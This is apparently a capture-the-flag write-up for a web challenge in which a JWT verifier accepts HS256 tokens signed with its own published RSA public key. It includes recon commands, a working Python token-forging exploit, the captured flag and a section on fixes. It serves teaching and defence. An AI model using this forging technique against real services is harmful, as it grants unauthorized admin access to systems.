---
title: "The Ledger Access Gate"
description: "The landing page exposed a tiny API description:"
event: "cryovault"
category: "web"
categoryLabel: "Web"
tags: ["ISFCR CryoVault Finals 2026","web"]
date: "2026-10-26"
teammate: false
source: "cryovault/web/1/writeup.md"
---

**Target:** https://isfcrpesu-ledger.chals.io
**Category:** Web
**Flag:** `isfcr{jwt_rs256_hs256_c0nfus10n_l3dg3r_7a2b}`

## Challenge description

The landing page exposed a tiny API description:

```
ledger gate
-----------
POST /login  {"user":"..."}  -> a signed session token (role: guest)
GET  /pubkey                     -> service signing public key (PEM)
GET  /flag   (Authorization: Bearer <token>) -> ledger seal, admins only
flag format: isfcr{...}
```

The goal: obtain a token with `role: admin` and read `/flag`.

## Recon

Requesting the public key:

```bash
curl -s https://isfcrpesu-ledger.chals.io/pubkey
```

```pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAlsf266DdK5wHctJlOyFY
...
twIDAQAB
-----END PUBLIC KEY-----
```

Logging in returns a JWT:

```bash
curl -s -X POST https://isfcrpesu-ledger.chals.io/login \
  -H 'Content-Type: application/json' -d '{"user":"admin"}'
```

```json
{"token":"eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiZ3Vlc3QifQ.C1_zi0..."}
```

Decoding the payload shows the server always assigns `role: guest`, regardless of the
requested username:

```json
{"user":"admin","role":"guest"}
```

Header:

```json
{"alg":"RS256","typ":"JWT"}
```

So the server signs RS256 tokens with a private key, and publishes the matching public key.
The intended hurdle is forging an admin token without the private key.

## The vulnerability: RS256 → HS256 algorithm confusion

The classic JWT key-confusion bug happens when a verifier is told to accept multiple
algorithms (here RS256 and HS256) but does not enforce that the algorithm matches the key
type. With a properly written verifier:

- `RS256` verifies with the RSA **public** key (safe — it can only verify).
- `HS256` verifies with an HMAC **shared secret** (must be secret).

If the library is called with a single "key" and the algorithm is taken from the token
header, an attacker can set `alg: HS256` and use the **public key** as the HMAC secret.
The server then computes `HMAC-SHA256(public_key, header.payload)` and compares it to the
attacker's signature. Since the public key is public, the attacker can produce a matching
signature, and the server accepts the forged token.

A first, cheap probe confirms the server accepts HMAC tokens at all: forging a token with
`role: guest` got a **403 "guests cannot read the ledger seal"** instead of the
`401 InvalidSignature` every other wrong-key attempt returned. That 403 is the tell — the
signature verified, and only the role check failed.

## Exploit

No special JWT library is needed; produce the token by hand with `hmac` + `hashlib`.

```python
import base64, hmac, hashlib, json, urllib.request

pub = open("pub.pem").read()          # exact bytes from GET /pubkey

def b64(b):
    return base64.urlsafe_b64encode(b).rstrip(b"=")

def forge(payload, key, alg="HS256"):
    header  = b64(json.dumps({"alg": alg, "typ": "JWT"}, separators=(",", ":")).encode())
    body    = b64(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = header + b"." + body
    sig = b64(hmac.new(key.encode(), signing_input, hashlib.sha256).digest())
    return (signing_input + b"." + sig).decode()

token = forge({"user": "admin", "role": "admin"}, pub)

req = urllib.request.Request(
    "https://isfcrpesu-ledger.chals.io/flag",
    headers={"Authorization": "Bearer " + token},
)
print(urllib.request.urlopen(req).read().decode())
```

Run it:

```bash
curl -s https://isfcrpesu-ledger.chals.io/pubkey -o pub.pem
python3 forge.py
```

Response:

```json
{"flag":"isfcr{jwt_rs256_hs256_c0nfus10n_l3dg3r_7a2b}"}
```

## Why it works

The verifier effectively does something like:

```python
alg = jwt.get_unverified_header(token)["alg"]
jwt.decode(token, key=PUBLIC_KEY_PEM, algorithms=["RS256", "HS256"])
```

Because the published key is a string, the same value is handed to both the RSA verifier
and the HMAC verifier. Under HS256 it becomes the shared secret, which the attacker also
has.

## Fix

- **Pin the algorithm.** Never trust `alg` from the token header; verify only the algorithm
  you issue (`algorithms=["RS256"]`).
- **Separate key material by algorithm.** If both symmetric and asymmetric tokens are
  supported, load keys per algorithm and never pass an RSA public key into an HMAC path.
- **Use the right key object.** Pass a real public-key object (not a PEM string) to the
  RSA verifier so the library cannot reinterpret it as an HMAC secret.
- **Don't publish the same key for other uses.** A key used only for verification should
  still be treated as algorithm-specific.
- **Least privilege in claims.** This bug is only dangerous because a valid token grants a
  role change; also consider server-side role lookup rather than trusting `role` in the
  token.

## Flag

```
isfcr{jwt_rs256_hs256_c0nfus10n_l3dg3r_7a2b}
```
